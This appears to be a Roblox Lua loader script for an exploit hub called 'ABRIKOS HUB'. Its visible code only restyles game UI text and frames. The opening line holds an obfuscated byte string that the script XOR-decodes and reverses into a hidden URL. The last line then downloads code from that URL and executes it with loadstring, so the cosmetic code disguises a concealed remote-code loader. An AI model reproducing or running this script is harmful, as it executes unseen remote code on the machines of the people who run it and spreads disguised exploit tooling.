
--[[ STAGE 2: VISUAL CORE ]]
local tNUsY5HU_8aQ53K="\219\218\217\100\017\025\111\027\104\115\102\126\097\110\099\107\122\071\119\115\067\005\014\022\123\120\021\069\065\076\077\103\101\027\087\083\098\107\108\105\118\116\104\165\115\115\124\175\122\171\180\064\064\190\189\072\072\082\085\132\128\143\083\153\141\152\091\163\172\163\171\168\181\171\183\227\180\177\239\237\237\185\135\240\131\128\128\150\251\251\147\150\206\147\152\153\205\201\215\153\227\226\225\227\042\039\047\053\033\222\243\051\063\041\250\002\006\063\012\000\015\057\022\003\019\031\014\027\020\102\017\017\038\110\111\103\103\045\043\060\115\114\124\122\116"local HChOAaM3rqdiWMSeEopb6e=38 local zRTlhEioMiCP2Mn3ilH=190 local ZmgjDlCKpySL=1 local ECqTaxzrB925jRSHfxTR=2 local KxtGQfVA7VCyq=10 local yZ7axgdCj2FviSfD=true local jQxyzXQVYm37BL=bit32 and bit32.bxor if not jQxyzXQVYm37BL then jQxyzXQVYm37BL=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local LIzeKqVRKuajUw072GjM={}for YZBpfoLBTDiL=1,#tNUsY5HU_8aQ53K do local INuuxPGgsRPy3ERPmO=string.byte(tNUsY5HU_8aQ53K,YZBpfoLBTDiL)local SLdW9UionK6iiClWFCX=(zRTlhEioMiCP2Mn3ilH+(YZBpfoLBTDiL*ECqTaxzrB925jRSHfxTR)+KxtGQfVA7VCyq)%256 if ZmgjDlCKpySL==0 then INuuxPGgsRPy3ERPmO=(INuuxPGgsRPy3ERPmO-SLdW9UionK6iiClWFCX)%256 LIzeKqVRKuajUw072GjM[YZBpfoLBTDiL]=string.char(jQxyzXQVYm37BL(INuuxPGgsRPy3ERPmO,HChOAaM3rqdiWMSeEopb6e))else INuuxPGgsRPy3ERPmO=jQxyzXQVYm37BL(INuuxPGgsRPy3ERPmO,HChOAaM3rqdiWMSeEopb6e)LIzeKqVRKuajUw072GjM[YZBpfoLBTDiL]=string.char((INuuxPGgsRPy3ERPmO-SLdW9UionK6iiClWFCX)%256)end end local doM9gkS9RwukDcO=table.concat(LIzeKqVRKuajUw072GjM)if yZ7axgdCj2FviSfD then doM9gkS9RwukDcO=string.reverse(doM9gkS9RwukDcO)end local tte0qyQqyYzehtasiH6w=doM9gkS9RwukDcO
local HubName = "ABRIKOS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(tte0qyQqyYzehtasiH6w))()
